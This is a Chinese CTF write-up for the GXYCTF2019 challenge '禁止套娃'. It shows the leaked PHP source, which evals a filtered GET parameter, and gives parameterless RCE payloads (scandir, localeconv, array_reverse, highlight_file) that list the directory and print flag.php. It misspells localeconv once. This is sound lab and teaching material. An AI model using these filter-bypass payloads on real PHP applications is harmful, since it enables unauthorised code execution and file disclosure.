# [GXYCTF2019]禁止套娃

## 知识点

`git泄露`

`无参RCE`

## 解题

`git`下载后`index.php`内容如下

```php
<?php
include "flag.php";
echo "flag在哪里呢？<br>";
if(isset($_GET['exp'])){
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                // echo $_GET['exp'];
                @eval($_GET['exp']);
            }
            else{
                die("还差一点哦！");
            }
        }
        else{
            die("再好好想想！");
        }
    }
    else{
        die("还想读flag，臭弟弟！");
    }
}
// highlight_file(__FILE__);
?>
```

过滤了伪协议，过滤了很多字符，过滤了参数

`Payload`

```
需要先查看一下当前的目录情况

scandir(current(localecnov())) 

localecnov() 函数返回一个包含本地数字及货币格式信息的数组。相当于Linux的ls。(我上面放的链接也简单说了一下这个函数)。

scandir()就是列出目录中的文件和目录.

current() 返回数组中当前元素的值

exp=print_r(scandir(current(localeconv())));
return: Array ( [0] => . [1] => .. [2] => .git [3] => flag.php [4] => index.php )
```

使用反转数组函数:`array_reverse()`。再让指针指向下一个数组元素（第二个）`next()`

```
exp=print_r(next(array_reverse(scandir(current(localeconv())))));
return: flag.php
highlight_file(next(array_reverse(scandir(current(localeconv())))));
```

### chdir()

这个函数是用来跳目录的，有时想读的文件不在当前目录下就用这个来切换，因为`scandir()`会将这个目录下的文件和目录都列出来，那么利用操作数组的函数将内部指针移到我们想要的目录上然后直接用`chdir`切就好了，如果要向上跳就要构造`chdir('..')`